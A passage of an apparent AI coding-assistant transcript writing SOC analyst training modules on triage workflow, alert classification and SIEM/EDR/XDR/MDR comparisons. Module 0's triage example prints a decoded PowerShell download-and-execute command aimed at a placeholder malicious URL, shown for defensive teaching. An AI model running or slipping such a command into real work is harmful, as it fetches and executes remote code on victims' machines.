Sysmon, basic networking, MITRE ATT&CK mapping, ticket writing, communication\n\n### L2 SOC Analyst (Tier 2)\n- Deep-dive investigation of escalated alerts\n- Malware analysis (static/dynamic)\n- Memory forensics basics\n- Detection rule tuning\n- Threat hunting participation\n- Mentor L1 analysts\n\n### L3 SOC Analyst / Senior Analyst (Tier 3)\n- Advanced threat hunting\n- Incident response leadership\n- Detection engineering\n- Red team collaboration\n- APT tracking\n- Strategic security improvements\n\n### SOC Manager\n- Shift scheduling and resource allocation\n- SLA/KPI tracking (MTTD, MTTR, alert volume, escalation rate)\n- Stakeholder communication\n- Budget and tooling decisions\n- Process improvement\n\n### Detection Engineer\n- Write/maintain detection rules (Sigma, KQL, SPL, YARA)\n- Reduce false positives\n- Coverage mapping to MITRE ATT&CK\n- Test rules against attack simulations\n\n### Threat Hunter\n- Proactive hypothesis-driven hunting\n- Adversary emulation\n- Threat intelligence integration\n- Novel technique discovery\n\n### Incident Responder\n- Containment, eradication, recovery\n- Forensic evidence preservation\n- Root cause analysis\n- Lessons learned documentation\n\n### Security Engineer\n- Platform administration (SIEM, EDR, SOAR)\n- Integration development\n- Pipeline automation\n- Infrastructure as Code for security tooling\n\n---\n\n## 0.4 Typical L1 Workflow\n\n```\n┌────────────────────────────────────────────────────────────────┐\n                        SHIFT START\n├────────────────────────────────────────────────────────────────┤\n  1. Shift handover review (open cases, pending escalations)\n  2. Dashboard review: alert queue, system health, threat intel\n  3. Prioritize queue by severity/SLA\n├────────────────────────────────────────────────────────────────┤\n  ALERT ARRIVES → ENRICH → TRIAGE → DECIDE\n  ├─ False Positive  → Close with reason\n  ├─ Benign Positive → Close with context\n  ├─ True Positive   → Create case → Escalate to L2\n  └─ Inconclusive    → Deepen investigation / time-box\n├────────────────────────────────────────────────────────────────┤\n  4. Case documentation (every action timestamped)\n  5. Escalation with full context package\n  6. Approved containment actions (playbook execution)\n  7. Shift handover documentation\n└────────────────────────────────────────────────────────────────┘\n                        SHIFT END\n```\n\n---\n\n## 0.5 SOC Operational Models\n\n### 24/7 SOC\nSingle team covers all hours. Risk: analyst fatigue, coverage gaps during handover.\n\n### Follow-the-Sun SOC\nDistributed teams across time zones (e.g., US → EMEA → APAC). Continuous coverage without night shifts.\n**Handover critical**: Structured handoff document, overlapping shifts.\n\n### Hybrid / MXDR Model\n- Internal L1/L2 + External MDR provider for nights/weekends/overflow\n- MDR handles Tier 1 triage; internal team handles Tier 2+\n- Shared case management platform\n\n---\n\n## 0.6 Core Concepts: Event → Alert → Incident → Case\n\n| Term | Definition | Example |\n|------|------------|---------|\n| **Event** | Raw, single occurrence recorded by a source | Windows Event ID 4624 (logon) |\n| **Alert** | Correlated/analyzed event exceeding threshold | \"5 failed logons + 1 success in 5 min\" |\n| **Detection** | Logic that generates alerts (rule, ML, behavioral) | Sigma rule, Splunk correlation search |\n| **Incident** | Confirmed security event requiring response | \"Compromised admin account\" |\n| **Case** | Formal tracking record in ticketing system | INC-2024-001234 in ServiceNow |\n| **Finding** | Observation from investigation | \"Malware executed via macro\" |\n| **IOC** | Indicator of Compromise (static artifact) | Hash, IP, domain, registry key |\n| **IOA** | Indicator of Attack (behavioral pattern) | \"PowerShell downloading encoded script\" |\n| **TTP** | Tactics, Techniques, Procedures | T1059.001 PowerShell, T1003 Credential Dumping |\n\n### Critical Distinctions\n\n**Event ≠ Alert**: Millions of events → hundreds of alerts. Events are raw; alerts are actionable.\n\n**Alert ≠ Incident**: Most alerts are false positives. An incident is a *confirmed* security event requiring coordinated response.\n\n**IOC vs IOA**:\n- IOC = \"What happened\" (reactive, static, ages quickly)\n- IOA = \"What is happening\" (proactive, behavioral, durable)\n\n---\n\n## 0.7 Lifecycle: Event → Closure\n\n```\nEVENT (Raw Log)\n    │\n    ▼\nINGESTION & NORMALIZATION (SIEM/XDR)\n    │\n    ▼\nCORRELATION / DETECTION (Rule Match / ML / Threat Intel Hit)\n    │\n    ▼\nALERT GENERATED (Queue in SOC Platform)\n    │\n    ▼\nL1 TRIAGE (Enrichment + Context Gathering)\n    │\n    ├─► FALSE POSITIVE → Close (Document Why)\n    │\n    ├─► BENIGN POSITIVE → Close (Document Context)\n    │\n    ├─► INCONCLUSIVE → Deepen Investigation (Time-boxed)\n    │\n    └─► TRUE POSITIVE → CREATE INCIDENT CASE\n                            │\n                            ▼\n                    ESCALATION TO L2\n                            │\n                            ▼\n                    L2 INVESTIGATION\n                            │\n                            ▼\n                    CONTAINMENT / ERADICATION\n                            │\n                            ▼\n                    RECOVERY\n                            │\n                            ▼\n                    LESSONS LEARNED / CLOSURE\n```\n\n---\n\n## 0.8 Severity, Priority, SLA, Impact, Urgency\n\n| Concept | Definition | L1 Relevance |\n|---------|------------|--------------|\n| **Severity** | Technical criticality of the threat | P1=Critical (active breach), P2=High, P3=Medium, P4=Low |\n| **Priority** | Business urgency for response | Combines severity + asset criticality + data sensitivity |\n| **Impact** | Potential damage if true positive | Data loss, financial, reputational, operational |\n| **Urgency** | Time sensitivity of response | Active ransomware = minutes; failed logins = hours |\n| **SLA** | Contractual response time | P1: 15 min ack, 1 hr containment; P4: 24-48 hr |\n\n**Key Insight**: Severity ≠ Priority. A P1-severity alert on a test server may be P3 priority. A P2-severity alert on the CEO's laptop is P1 priority.\n\n---\n\n## 0.9 False Positive vs True Positive vs Benign Positive\n\n| Classification | Definition | Action |\n|----------------|------------|--------|\n| **True Positive (TP)** | Alert correctly identifies malicious activity | Escalate, contain, investigate |\n| **False Positive (FP)** | Alert triggered but no malicious activity | Close, tune rule if recurring |\n| **Benign Positive (BP)** | Alert triggered by authorized/expected activity | Close, document context (e.g., admin script, vuln scan) |\n| **Inconclusive** | Insufficient evidence to classify | Extend investigation, gather more telemetry, re-evaluate |\n\n---\n\n## 0.10 What an L1 Analyst Actually Does at 03:00\n\n> **Alert**: \"Suspicious PowerShell Execution - Encoded Command\"\n> **Host**: WORKSTN-047 (Marketing Dept)\n> **User**: j.smith@company.com\n\n**Your 15-minute triage**:\n1. **Pull alert details**: Rule name, timestamp, process tree, command line\n2. **Enrich user**: AD groups, recent logins, MFA status, department\n3. **Enrich host**: EDR status, recent alerts, installed software, criticality\n4. **Analyze process tree**: `winword.exe → powershell.exe -enc ...`\n5. **Check command line**: Decode Base64 → `IEX (New-Object Net.WebClient).DownloadString('http://malicious.ps1')`\n6. **Check network**: Did PowerShell make outbound connections? To where? Reputation?\n7. **Check file system**: Any dropped files? Hashes? Reputation?\n8. **Check timeline**: What happened 30 min before/after?\n9. **Threat intel**: IP/domain/hash reputation (VT, AbuseIPDB, internal TIP)\n10. **Decide**: TP → Escalate with full package. FP/BP → Close with evidence.\n\n---\n\n## 0.11 Common L1 Mistakes\n\n| Mistake | Consequence | Correction |\n|---------|-------------|------------|\n| Closing alert without enrichment | Missed breach | Always enrich: user, host, process, network, TI |\n| Escalating without context | L2 wastes time gathering basics | Package: timeline, process tree, IOCs, user/host context |\n| Confusing severity with priority | Wrong SLA applied | Assess asset criticality + data sensitivity |\n| Not documenting \"why\" | No audit trail, knowledge loss | Every decision: evidence → conclusion |\n| Ignoring \"benign positive\" patterns | Rule fatigue, missed tuning opportunities | Tag BP, feed back to detection engineering |\n| Tunnel vision on single alert | Miss campaign | Check for related alerts across environment |\n\n---\n\n## 0.12 Study Checklist for Module 0\n\n- [ ] Explain SOC purpose and architecture\n- [ ] Differentiate L1/L2/L3/Manager/Detection Engineer/Hunter/IR roles\n- [ ] Describe typical L1 shift workflow\n- [ ] Compare 24/7 vs Follow-the-Sun vs MXDR models\n- [ ] Define Event, Alert, Detection, Incident, Case, Finding, IOC, IOA, TTP\n- [ ] Explain Event → Alert → Incident → Closure lifecycle\n- [ ] Differentiate Severity, Priority, Impact, Urgency, SLA\n- [ ] Classify alerts: TP, FP, BP, Inconclusive\n- [ ] Walk through 03:00 triage scenario end-to-end\n\n---\n\n## 0.13 Key Takeaways\n\n1. **SOC is a process, not just tools** — People and process scale; tools alone don't\n2. **L1 is the filter** — Your job: separate signal from noise, package context for L2\n3. **Context is everything** — An alert without enrichment is useless\n4. **Documentation = professionalism** — If it's not documented, it didn't happen\n5. **Escalation is not failure** — Proper escalation with context is success\n6. **False positives are data** — They drive detection tuning; track patterns\n\n---\n\n*Next: Module 1 — MDR / XDR / MXDR Deep Dive*",
  "filePath": "/Users/n0rthstar/Desktop/adsız klasör/mxdr-l1-soc-crash-course/modules/00-soc-mxdr-fundamentals.md"
}
```

**Output:**
```
Wrote file successfully.
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 24.4s)

_Thinking:_

Module 0 is created. Now let me create Module 1 - MDR/XDR/MXDR Deep Dive.

**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Create Module 0 - SOC and MXDR Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
      "priority": "high",
      "status": "in_progress"
    },
    {
      "content": "Create Module 2 - Alert Triage Methodology",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 3 - Incident Severity and Escalation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 4 - Windows Security & Event Logs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 5 - Sysmon Telemetry",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 6 - PowerShell Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 7 - Active Directory",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 8 - Kerberos and NTLM",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 9 - Networking for SOC",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 10 - DNS Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 11 - HTTP/HTTPS/TLS",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 12 - Network Traffic Analysis",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 13 - Endpoint Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 14 - Malware Fundamentals",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 15 - Command and Control",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 16 - Phishing and Email Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 17 - Threat Intelligence",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 18 - MITRE ATT&CK",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 19 - Common Attacks",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 20 - Web Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 21 - Linux Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 22 - SOAR and Automation",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 23 - Query and Log Analysis",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 24 - Incident Response",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 25 - Forensics Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 26 - Security Products",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 27 - Cloud Security Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 28 - Real SOC Case Studies",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 29 - Interview Preparation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 30 - Practical Labs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 31 - SOC Ticketing",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 32 - Advanced Optional Topics",
      "priority": "low",
      "status": "pending"
    },
    {
      "content": "Create Cheat Sheets and Reference Materials",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Curriculum Index and Study Guide",
      "priority": "high",
      "status": "pending"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Create Module 0 - SOC and MXDR Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
    "status": "in_progress",
    "priority": "high"
  },
  {
    "content": "Create Module 2 - Alert Triage Methodology",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 3 - Incident Severity and Escalation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 4 - Windows Security & Event Logs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 5 - Sysmon Telemetry",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 6 - PowerShell Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 7 - Active Directory",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 8 - Kerberos and NTLM",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 9 - Networking for SOC",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 10 - DNS Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 11 - HTTP/HTTPS/TLS",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 12 - Network Traffic Analysis",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 13 - Endpoint Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 14 - Malware Fundamentals",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 15 - Command and Control",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 16 - Phishing and Email Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 17 - Threat Intelligence",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 18 - MITRE ATT&CK",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 19 - Common Attacks",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 20 - Web Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 21 - Linux Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 22 - SOAR and Automation",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 23 - Query and Log Analysis",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 24 - Incident Response",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 25 - Forensics Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 26 - Security Products",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 27 - Cloud Security Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 28 - Real SOC Case Studies",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 29 - Interview Preparation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 30 - Practical Labs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 31 - SOC Ticketing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 32 - Advanced Optional Topics",
    "status": "pending",
    "priority": "low"
  },
  {
    "content": "Create Cheat Sheets and Reference Materials",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Curriculum Index and Study Guide",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 126.2s)

_Thinking:_

Now let me create Module 1.

**Tool: write**

**Input:**
```json
{
  "content": "# Module 1: MDR / XDR / MXDR Deep Dive\n\n**Priority: P0 — Must know before L1 interview**\n\n---\n\n## 1.1 Core Definitions\n\n### SIEM (Security Information and Event Management)\n**What it does**: Centralized log collection, normalization, correlation, alerting, reporting, compliance.\n**Data sources**: Firewalls, AD, DNS, proxy, servers, applications, network devices.\n**Strengths**: Breadth of visibility, compliance reporting, long-term retention, custom correlations.\n**Limitations**: High volume, rule maintenance, limited endpoint context, reactive.\n\n**Key vendors**: Splunk, Microsoft Sentinel, Elastic, QRadar, LogRhythm, Sumo Logic, Graylog.\n\n### EDR (Endpoint Detection and Response)\n**What it does**: Continuous endpoint monitoring, behavioral detection, investigation, response.\n**Telemetry**: Process execution, file/registry changes, network connections, DLL loads, memory access.\n**Strengths**: Deep endpoint visibility, behavioral analytics, automated response (isolation, kill process).\n**Limitations**: Endpoint-only view, agent deployment required, blind to network/cloud.\n\n**Key vendors**: CrowdStrike, SentinelOne, Microsoft Defender for Endpoint, Cortex XDR, Elastic Defend.\n\n### NDR (Network Detection and Response)\n**What it does**: Network traffic analysis, protocol parsing, behavioral anomaly detection.\n**Telemetry**: NetFlow, full packet capture, DNS, HTTP, TLS metadata, SMB, Kerberos.\n**Strengths**: Agentless, east-west visibility, encrypted traffic analysis (JA3, SNI), lateral movement detection.\n**Limitations**: Encrypted payload blindness, no endpoint context, placement challenges (cloud/remote).\n\n**Key vendors**: ExtraHop, Corelight, Darktrace, Vectra, Zeek/Suricata (open source).\n\n### XDR (Extended Detection and Response)\n**What it does**: Unified detection/response across endpoint + network + cloud + identity + email.\n**Architecture**: Native integration — single vendor, single console, correlated detections.\n**Strengths**: Cross-layer correlation, reduced tool sprawl, unified investigation, automated response.\n**Limitations**: Vendor lock-in, may not best-of-breed each layer, maturity varies.\n\n**Key vendors**: Cortex XDR (Palo Alto), Microsoft Defender XDR, CrowdStrike Falcon XDR, SentinelOne Singularity XDR, Trend Vision One.\n\n### MDR (Managed Detection and Response)\n**What it does**: Outsourced SOC — provider monitors your environment, triages, responds.\n**Service model**: 24/7 monitoring, alert triage, threat hunting, guided response, reporting.\n**Strengths**: Immediate 24/7 coverage, expertise access, reduces hiring burden.\n**Limitations**: Less control, context gaps (business knowledge), contract-dependent SLAs.\n\n**Key vendors**: Red Canary, Expel, Arctic Wolf, Secureworks, Mandiant, CrowdStrike Falcon Complete.\n\n### MXDR (Managed XDR)\n**What it does**: MDR service built on XDR platform — managed service + unified platform.\n**Differentiation**: Single platform (XDR) + managed service (MDR) = MXDR.\n**Value prop**: Platform consistency + human expertise + 24/7 coverage.\n\n**Key vendors**: Microsoft (Defender XDR + MXDR partners), Palo Alto (Cortex XDR + Unit 42), CrowdStrike (Falcon XDR + Complete), SentinelOne (Singularity XDR + Vigilance).\n\n### SOAR (Security Orchestration, Automation, and Response)\n**What it does**: Playbook automation, case management, integration hub, enrichment.\n**Capabilities**: Auto-enrichment (TI, CMDB), containment actions, ticket creation, notifications.\n**Role**: Force multiplier — handles repetitive tasks, ensures consistency.\n\n**Key vendors**: Palo Alto Cortex XSOAR, Splunk SOAR, Microsoft Sentinel (Logic Apps), FortiSOAR, Tines.\n\n### UEBA (User and Entity Behavior Analytics)\n**What it does**: Baseline normal behavior → detect anomalies (impossible travel, unusual access, data staging).\n**Data**: Authentication, file access, email, VPN, cloud activity.\n**Output**: Risk scores, behavioral alerts.\n\n### TIP (Threat Intelligence Platform)\n**What it does**: Aggregate, deduplicate, enrich, operationalize threat feeds.\n**Output**: IOCs with context (actor, campaign, malware family, confidence, TLP).\n\n### Security Data Lake\n**What it does**: Cheap long-term storage (Parquet/ORC) + query engine for hunting/compliance.\n**Role**: Cold storage for SIEM hot tier; fuels data science, ML training, retrospective hunts.\n\n---\n\n## 1.2 Critical Comparisons\n\n### SIEM vs XDR\n\n| Aspect | SIEM | XDR |\n|--------|------|-----|\n| **Scope** | Broad (all logs) | Focused (security telemetry) |\n| **Integration** | Bring-your-own-parser | Native, pre-built |\n| **Correlation** | Rule-based (manual) | Built-in cross-layer |\n| **Response** | Manual / SOAR | Native automated |\n| **Endpoint visibility** | Limited (forwarded logs) | Deep (agent telemetry) |\n| **Deployment** | Complex, months | Faster, opinionated |\n| **Best for** | Compliance, custom use cases | Security operations efficiency |\n\n**Reality**: Most orgs run both — SIEM for compliance/log retention + XDR for detection/response.\n\n### EDR vs XDR\n\n| Aspect | EDR | XDR |\n|--------|-----|-----|\n| **Visibility** | Endpoint only | Endpoint + Network + Cloud + Identity + Email |\n| **Correlation** | Local endpoint | Cross-domain |\n| **Investigation** | Pivot to other tools | Single console |\n| **Response** | Endpoint actions | Cross-domain actions |\n| **Data schema** | Proprietary | Unified (ideally) |\n\n**Evolution**: EDR → XDR is vendor consolidation play.\n\n### MDR vs MXDR\n\n| Aspect | MDR | MXDR |\n|--------|-----|------|\n| **Platform** | Any (provider-agnostic) | Provider's XDR platform |\n| **Telemetry** | Customer's existing tools | Unified XDR sensors |\n| **Onboarding** | Integrate with your stack | Deploy provider's agents |\n| **Consistency** | Varies by customer env | Standardized |\n| **Data ownership** | Customer logs stay | May reside in provider cloud |\n\n### EDR vs Antivirus (EPP)\n\n| Aspect | Antivirus / EPP | EDR |\n|--------|-----------------|-----|\n| **Detection** | Signature, heuristic | Behavioral, ML, behavioral |\n| **Visibility** | File scan results | Full process tree, memory, network |\n| **Response** | Quarantine file | Kill process, isolate host, rollback |\n| **Investigation** | None | Timeline, root cause, hunt |\n| **Threat types** | Known malware | Fileless, living-off-land, APT |\n\n**Key point**: EPP prevents; EDR detects/responds. Modern \"EPP\" often includes EDR (called EPP+EDR or NGAV).\n\n### SIEM vs SOAR\n\n| Aspect | SIEM | SOAR |\n|--------|------|------|\n| **Primary** | Detection, correlation, search | Automation, orchestration, case mgmt |\n| **Alert action** | Generate alert | Enrich, decide, act, ticket |\n| **Human role** | Analyze | Approve/override automation |\n| **Integration** | Log sources | Security tools (EDR, FW, TI, ITSM) |\n\n**Relationship**: SIEM generates alerts → SOAR automates response workflows.\n\n### NDR vs EDR\n\n| Aspect | NDR | EDR |\n|--------|-----|-----|\n| **Visibility** | Network traffic | Endpoint activity |\n| **Deployment** | Span port, TAP, cloud mirror | Agent on host |\n| **Encryption** | Metadata only (JA3, SNI) | Sees pre-encryption |\n| **Lateral movement** | Excellent (SMB, RPC, Kerberos) | Good (process + auth) |\n| **Remote/Cloud** | Hard | Native |\n\n**Complementary**: NDR sees what endpoints miss (unmanaged devices, IoT, east-west).\n\n### SOC vs MDR\n\n| Aspect | Internal SOC | MDR |\n|--------|--------------|-----|\n| **Control** | Full | Shared |\n| **Context** | Deep business knowledge | Limited |\n| **Cost** | High (people, tools, facility) | Predictable OPEX |\n| **Scaling** | Slow (hiring) | Fast (contract) |\n| **Best for** | Mature orgs, regulated | Mid-market, supplement |\n\n### SOC vs MXDR\n\nMXDR = Your internal L1/L2 + Provider's platform + Provider's 24/7 L1/L2.\n**Hybrid model**: Internal team owns day shift + critical incidents; provider covers nights/weekends/overflow.\n\n---\n\n## 1.3 Realistic MXDR Architecture\n\n```\n┌──────────────────────────────────────────────────────────────────────────────┐\n                              DATA SOURCES\n├──────────────────────────────────────────────────────────────────────────────┤\n  ENDPOINT          NETWORK           CLOUD              IDENTITY           EMAIL\n  ┌─────────┐       ┌─────────┐       ┌─────────┐        ┌─────────┐       ┌─────────┐\n  │ Laptops │       │ Firewall│       │ AWS     │        │ AD /    │       │ M365 /  │\n  │ Servers │       │ Switches│       │ Azure   │        │ Entra ID│       │ Gmail   │\n  │ Mobile  │       │ Zeek    │       │ GCP     │        │ Okta    │       │ Proofpt │\n  │ IoT/OT  │       │ Suricata│       │ SaaS    │        │         │       │         │\n  └────┬────┘       └────┬────┘       └────┬────┘        └────┬────┘       └────┬────┘\n       │                 │                 │                  │                 │\n       ▼                 ▼                 ▼                  ▼                 ▼\n┌──────────────────────────────────────────────────────────────────────────────┐\n                           XDR PLATFORM (Unified Sensor Layer)\n  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐\n  │ EDR Agent   │  │ NDR Sensor  │  │ Cloud Connector│  │ Identity Conn│\n  │ (Kernel)    │  │ (PCAP/NetFlow)│ │ (API/Logs)    │  │ (API/Logs)   │\n  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘\n         │                │                │                │\n         └────────────────┼────────────────┼────────────────┘\n                          ▼\n         ┌────────────────────────────────────────────────┐\n         │         NORMALIZATION & ENRICHMENT             │\n         │  Common Schema (OCSF/ECS) │ TI Enrichment      │\n         │  Asset/User Context       │ Behavioral Baselines│\n         └────────────────────┬───────────────────────────┘\n                              ▼\n         ┌────────────────────────────────────────────────┐\n         │           DETECTION ENGINE                     │\n         │  ┌─────────┐ ┌─────────┐ ┌─────────┐          │\n         │  │ Rules   │ │ ML/AI   │ │ Threat  │          │\n         │  │ (Sigma) │ │ Models  │ │ Intel   │          │\n         │  └─────────┘ └─────────┘ └─────────┘          │\n         └────────────────────┬───────────────────────────┘\n                              ▼\n         ┌────────────────────────────────────────────────┐\n         │              ALERT QUEUE                       │\n         │  Severity │ Status │ Assignee │ SLA Timer     │\n         └────────────────────┬───────────────────────────┘\n                              ▼\n┌──────────────────────────────────────────────────────────────────────────────┐\n                           TIERED SOC OPERATIONS\n├──────────────────────────────────────────────────────────────────────────────┤\n                                                                                \n   ┌─────────────────────┐    ┌─────────────────────┐    ┌─────────────────┐\n   │      L1 TIER        │───►│      L2 TIER        │───►│     L3 TIER     │\n   │  (Internal/Provider)│    │    (Internal)       │    │  (Internal/IR)  │\n   ├─────────────────────┤    ├─────────────────────┤    ├─────────────────┤\n   │ • Alert Triage      │    │ • Deep Investigation│    │ • Threat Hunting│\n   │ • Enrichment        │    │ • Malware Analysis  │    │ • Detection Eng │\n   │ • FP/BP Closure     │    │ • Forensics         │    │ • Red Team Collab│\n   │ • Basic Containment │    │ • Hunt Support      │    │ • IR Leadership │\n   │ • Escalation Pkg    │    │ • Detection Tuning  │    │ • APT Tracking  │\n   │ • Shift Handover    │    │ • Mentor L1         │    │ • Strategic     │\n   └─────────────────────┘    └─────────────────────┘    └─────────────────┘\n         │                            │                        │\n         └────────────────────────────┼────────────────────────┘\n                                      ▼\n         ┌────────────────────────────────────────────────┐\n         │           CASE MANAGEMENT (SOAR/ITSM)          │\n         │  ServiceNow │ Jira │ TheHive │ Cortex XSOAR    │\n         │  • Ticket lifecycle  • Playbooks  • Metrics   │\n         └────────────────────────────────────────────────┘\n                                      │\n         ┌────────────────────────────┼────────────────────────┐\n         ▼                            ▼                        ▼\n   ┌─────────────┐            ┌─────────────┐          ┌─────────────┐\n   │ CONTAINMENT │            │ ERADICATION │          │  RECOVERY   │\n   │ • Isolate   │            │ • Remove    │          │ • Restore   │\n   │ • Block     │            │ • Remediate │          │ • Verify    │\n   │ • Disable   │            │ • Patch     │          │ • Monitor   │\n   └─────────────┘            └─────────────┘          └─────────────┘\n```\n\n---\n\n## 1.4 How They Work Together: Data Flow Example\n\n**Scenario**: Phishing email → Credential theft → VPN login → Lateral movement → Data staging\n\n| Stage | Telemetry Source | Detection | Response |\n|-------|------------------|-----------|----------|\n| **Email** | Email Security (Proofpoint/M365) | Malicious attachment, sender reputation | Quarantine, block sender |\n| **Click** | Proxy / DNS / EDR | User visits phishing URL, enters creds | Block URL, alert on cred submit |\n| **Auth** | AD / Entra ID / VPN | Successful login from new geo, impossible travel | MFA challenge, alert |\n| **Recon** | EDR / NDR | `whoami`, `net view`, `ldapsearch` on compromised host | Alert, enrich |\n| **Lateral** | NDR / AD / EDR | SMB admin$, RDP, Pass-the-Hash, Kerberoasting | Isolate host, disable account |\n| **Staging** | EDR / NDR | Large archive creation, unusual outbound | Block egress, capture memory |\n| **Exfil** | NDR / Proxy / Cloud | Data transfer to rare domain, cloud storage upload | Block, forensic capture |\n\n**Single pane of glass**: All above correlated in XDR → Single incident timeline → One case.\n\n---\n\n## 1.5 What This Means for L1 Analyst\n\n| Platform | What You See | What You Do |\n|----------|--------------|-------------|\n| **SIEM** | Raw logs, custom dashboards, search | Deep log queries, compliance reports |\n| **EDR** | Process trees, file hashes, MITRE tags | Host isolation, process kill, timeline |\n| **NDR** | Network flows, beaconing, SMB anomalies | Pivot to host, correlate with EDR |\n| **XDR** | Unified timeline, cross-layer alerts | Single investigation view, auto-enrichment |\n| **MXDR** | Shared queue with provider | Handover notes, joint escalation, unified SLA |\n| **SOAR** | Playbook execution, enrichment results | Approve actions, review auto-ticketed cases |\n\n**Key insight**: In MXDR, you may *not* have raw SIEM access. You work in the XDR console. Know your platform's query language (KQL, XQL, etc.) and investigation workflow.\n\n---\n\n## 1.6 Interview Questions for This Module\n\n1. **What is the difference between SIEM and XDR?**\n   - SIEM: broad log collection, compliance, custom rules. XDR: native multi-layer detection/response, unified console.\n\n2. **How does MDR differ from MXDR?**\n   - MDR: service on your tools. MXDR: service on provider's XDR platform.\n\n3. **Why would an organization choose MXDR over building internal 24/7 SOC?**\n   - Cost, speed to coverage, expertise access, predictable SLA, staffing relief.\n\n4. **Where does SOAR fit in the MXDR architecture?**\n   - Automates enrichment, containment, ticketing between XDR alert queue and case management.\n\n5. **What telemetry does NDR provide that EDR cannot?**\n   - East-west traffic, unmanaged devices, encrypted traffic metadata (JA3/SNI), lateral movement via network protocols.\n\n6. **Explain the data flow from endpoint to L1 analyst in an MXDR platform.**\n   - EDR agent → XDR normalization → Detection engine → Alert queue → L1 triage → Escalation → Case mgmt.\n\n---\n\n## 1.7 Study Checklist for Module 1\n\n- [ ] Define SIEM, EDR, NDR, XDR, MDR, MXDR, SOAR, UEBA, TIP, Data Lake\n- [ ] Compare SIEM vs XDR, EDR vs XDR, MDR vs MXDR, EDR vs AV, SIEM vs SOAR, NDR vs EDR\n- [ ] Draw MXDR architecture from memory\n- [ ] Explain how email → endpoint → network → cloud telemetry correlates in XDR\n- [ ] Identify what L1 sees/does in each platform\n- [ ] Answer all interview questions without notes\n\n---\n\n*Next: Module 2 — Alert Triage Methodology (THE core L1 skill)*",
  "filePath": "/Users/n0rthstar/Desktop/adsız klasör/mxdr-l1-soc-crash-course/modules/01-mdr-xdr-mxdr-deep-dive.md"
}
```

